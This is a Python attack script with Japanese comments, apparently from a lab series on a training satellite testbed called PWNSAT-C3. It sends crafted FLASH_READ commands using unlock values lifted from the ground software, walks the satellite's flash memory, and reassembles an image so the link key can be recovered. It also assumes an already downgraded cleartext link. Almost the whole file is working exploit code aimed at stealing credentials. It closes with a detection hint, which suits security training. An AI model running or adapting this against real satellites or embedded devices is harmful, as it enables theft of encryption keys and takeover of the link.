#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""08_flash_read_dump_usb.py -- 衛星のフラッシュメモリの中身を、操作に使うのと
同じケーブル越しに読み出す。

読み出しの経路にはゲート（関門）があるが、そのゲートは 2 つの固定値でしかない:

    worker.cpp:
      if (window_id != flash_window_id || unlock != flash_unlock_tag) {
          telemetrySPPTransmitError("FLASH WINDOW LOCKED");

どちらの定数も地上局ソフトウェアに同梱されている（PWNSAT-C3 の settings.py の
DEFAULT_FLASH_WINDOW_ID と DEFAULT_FLASH_UNLOCK_TAG）。クライアントのコピー
すべてと一緒に配られる値は、認証情報ではない。ただの障害物で、それも
中身を見ていない人にとってだけである。

ペイロードの構成。ハンドラ（コマンドを処理する関数）からそのまま読み取った。
エンディアン（複数バイトの数値を並べる順序）が 2 種類あることに注意する。
同じ 6 オクテット（1 オクテット = 8 ビット = 1 バイト）の中で、オフセットはリトルエンディアン（下位バイトが先）、
アンロックタグはビッグエンディアン（上位バイトが先）である:

    [0]    window_id
    [1..2] offset      リトルエンディアン
    [3]    read_len
    [4..5] unlock      ビッグエンディアン

期待される結果: 返事を組み合わせたイメージ（読み出したメモリの写し）ができ、
その中のどこかにリンクの鍵が入っている。
"""

import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import FlatSat, TC_FLASH_READ, hexdump  # noqa: E402

# PWNSAT-C3/backend/settings.py からそのまま持ってきた値。
WINDOW_ID = 0xA5
UNLOCK_TAG = 0xC35A


def read_request(offset: int, length: int, *, window: int = WINDOW_ID,
                 unlock: int = UNLOCK_TAG) -> bytes:
    return bytes([window & 0xFF,
                  offset & 0xFF, (offset >> 8) & 0xFF,      # リトルエンディアン
                  length & 0xFF,
                  (unlock >> 8) & 0xFF, unlock & 0xFF])     # ビッグエンディアン


TM_FLASH_READ = 0x0B


def flash_chunk(payload: bytes):
    """FLASH_READ の返事から (offset, data) を取り出す。返事でなければ None。

    ファームウェアは問い合わせと同じ APID で答え、先頭に独自のヘッダを付ける。
    並びは、衛星 ID、オフセット（リトルエンディアン）、コピーしたオクテット数、
    データ本体、最後にそのデータに対する CRC-8（誤り検出用のチェック値）である。
    ペイロード全体をフラッシュの中身として読むと、ヘッダとチェック値まで
    データとして取り込んでしまう。
    """
    if len(payload) < 5:
        return None
    offset = payload[1] | (payload[2] << 8)
    n = payload[3]
    if len(payload) < 4 + n + 1:
        return None
    return offset, bytes(payload[4:4 + n])


def flash_replies(fsat, replies):
    """このコマンドへの返事だけを、ボードが送った順に返す。

    ボードは USB への出力を 1 Hz（1 秒に 1 回）の周期で処理するため、返事を
    待つ間に、それ以前の通信でまだ送られていなかったものも一緒に届く。PING への
    応答、航法テレメトリ（衛星から送られる位置の報告）、センサーイベントなどである。届いたペイロードを全部
    取っていたころは、それらまでイメージに組み込み、フラッシュの中身として扱っていた。
    """
    out = []
    for p in replies:
        if p.apid != TM_FLASH_READ or not p.payload:
            continue
        got = flash_chunk(fsat.plaintext(p))
        if got:
            out.append(got)
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--start", type=lambda x: int(x, 0), default=0x0000)
    ap.add_argument("--end", type=lambda x: int(x, 0), default=0x0400,
                    help="exclusive. Keep it small the first time")
    ap.add_argument("--chunk", type=int, default=64, help="octets per request")
    ap.add_argument("--window", type=lambda x: int(x, 0), default=WINDOW_ID)
    ap.add_argument("--unlock", type=lambda x: int(x, 0), default=UNLOCK_TAG)
    ap.add_argument("--cleartext", action="store_true",
                    help="the link is already downgraded (see attack 24)")
    ap.add_argument("--out", default=None, help="write the image here")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    print(f"[*] window=0x{args.window:02X} unlock=0x{args.unlock:04X}  "
          f"-- both read out of the ground software, not guessed")

    image = bytearray()
    with FlatSat(port=args.port, encrypt=not args.cleartext,
                 verbose=not args.quiet) as fsat:

        print("\n=== 1. one window, to see whether the gate opens at all ===")
        replies = fsat.send(TC_FLASH_READ,
                            read_request(args.start, args.chunk,
                                         window=args.window, unlock=args.unlock),
                            seq=1, listen=1.5)
        raw = [fsat.plaintext(p) for p in replies if p.payload]
        if any(b"LOCKED" in b for b in raw):
            print("[!] FLASH WINDOW LOCKED -- the window id or the unlock tag is wrong.")
            return 1
        body = flash_replies(fsat, replies)
        if not body:
            kinds = ", ".join(f"0x{p.apid:03X}" for p in replies) or "nothing"
            print(f"[!] no FLASH_READ reply came back (saw: {kinds}).")
            return 1
        print(hexdump(body[0][1][:64]))

        print(f"\n=== 2. walking 0x{args.start:04X}..0x{args.end:04X} ===")
        seq = 2
        offset = args.start
        stalled = 0
        while offset < args.end:
            replies = fsat.send(TC_FLASH_READ,
                                read_request(offset, args.chunk,
                                             window=args.window, unlock=args.unlock),
                                seq=seq, listen=1.5)
            seq = (seq + 1) & 0x3FFF
            chunks = flash_replies(fsat, replies)
            if not chunks:
                raw = [fsat.plaintext(p) for p in replies if p.payload]
                if any(b"OOB" in b for b in raw):
                    print(f"    0x{offset:04X}  past the end of the window")
                    break
                stalled += 1
                print(f"    0x{offset:04X}  no reply")
                if stalled >= 3:
                    print("    three in a row with nothing back; stopping here")
                    break
                offset += args.chunk
                continue

            stalled = 0
            delivered = 0
            for at, data in chunks:
                # 届いた順に後ろへ足すのではなく、ボードが示した位置に置く。
                # こうすると遅れて届いた返事も自分のオフセットに収まり、
                # それより後ろのデータがずれない。
                if len(image) < at + len(data):
                    image.extend(b"\x00" * (at + len(data) - len(image)))
                image[at:at + len(data)] = data
                delivered = max(delivered, at + len(data) - offset)

            if not args.quiet:
                shown = ", ".join(f"0x{a:04X}+{len(d)}" for a, d in chunks)
                print(f"    0x{offset:04X}  {shown}  (image {len(image)})")

            # 要求した量ではなく、ボードが実際に送った量だけ進める。ボードは
            # 1 回の読み出しを flash_read_max_bytes で打ち切り、実際の数を返す。
            # 要求した量で進めると、打ち切られて読まれなかった部分を飛ばしてしまい、
            # その隙間はゼロで埋まって、フラッシュの中身のように見えてしまう。
            offset += delivered if delivered > 0 else args.chunk

    print(f"\n[+] {len(image)} octets assembled.")
    if args.out:
        Path(args.out).write_bytes(bytes(image))
        print(f"[+] written to {args.out}")

    print("\nNext: run the key-recovery method from lab 2.1 against this image.\n"
          "This time it came off the board, not out of a repository.")
    print("\nWhat the sensor should have shown: one read is maintenance, a walk "
          "across offsets is somebody taking a copy.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
